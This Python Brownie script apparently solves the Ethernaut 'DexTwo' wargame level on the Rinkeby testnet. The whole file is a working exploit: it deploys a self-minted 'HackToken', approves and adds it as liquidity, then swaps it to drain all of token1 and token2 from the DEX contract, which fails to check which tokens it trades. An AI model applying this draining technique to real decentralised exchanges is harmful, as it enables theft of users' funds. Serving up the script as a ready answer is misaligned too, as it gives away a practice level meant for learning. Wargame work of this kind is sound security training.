from brownie import accounts, DexTwo, HackToken
from web3 import Web3

initial_supply = Web3.toWei("1000000", "ether")

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x7d8C176e1329e04FA87C34E3640E2ACA6a9A259B"
dex_two = DexTwo.at(instance_address)
# deploy out token
hack_token = HackToken.deploy(initial_supply, {"from": account})
HT = hack_token.address

# -------------------------------------------------------------------------
# to complete this level we must drain the contract balance for both tokens
# -------------------------------------------------------------------------


def level_complete():
    return (
        dex_two.balanceOf(dex_two.token1(), instance_address) == 0
        and dex_two.balanceOf(dex_two.token2(), instance_address) == 0
    )


def balance(token, address):
    if token == "token1" and address == "me":
        return dex_two.balanceOf(dex_two.token1(), account.address)
    elif token == "token2" and address == "me":
        return dex_two.balanceOf(dex_two.token2(), account.address)
    elif token == "token1" and address == "contract":
        return dex_two.balanceOf(dex_two.token1(), instance_address)
    elif token == "token2" and address == "contract":
        return dex_two.balanceOf(dex_two.token2(), instance_address)
    elif token == "HT" and address == "contract":
        return dex_two.balanceOf(HT, instance_address)
    else:
        print("Wrong inputs")


def exploit():
    # view our balance of HT
    print(hack_token.balanceOf(account.address))

    # approve the DexTwo contract to spend your tokens
    tx = hack_token.approve(instance_address, initial_supply, {"from": account})
    tx.wait(1)

    # perform exploit: add liquidity, swap HT for all of token1
    tx = dex_two.add_liquidity(HT, 100, {"from": account})
    tx.wait(1)
    print(f"HT balance of contract: {balance('HT', 'contract')}")
    print(f"Token1 balance of contract: {balance('token1', 'contract')}")
    print(f"Token2 balance of contract: {balance('token2', 'contract')}")

    tx = dex_two.swap(HT, dex_two.token1(), 100, {"from": account})
    tx.wait(1)
    print(f"HT balance of contract: {balance('HT', 'contract')}")
    print(f"Token1 balance of contract: {balance('token1', 'contract')}")
    print(f"Token2 balance of contract: {balance('token2', 'contract')}")

    # swap 200 HT for all token2
    tx = dex_two.swap(HT, dex_two.token2(), 200, {"from": account})
    tx.wait(1)
    print(f"HT balance of contract: {balance('HT', 'contract')}")
    print(f"Token1 balance of contract: {balance('token1', 'contract')}")
    print(f"Token2 balance of contract: {balance('token2', 'contract')}")

    # confirm that we have completed the level
    print(f"Level has been completed: {level_complete()}")


def main():
    exploit()
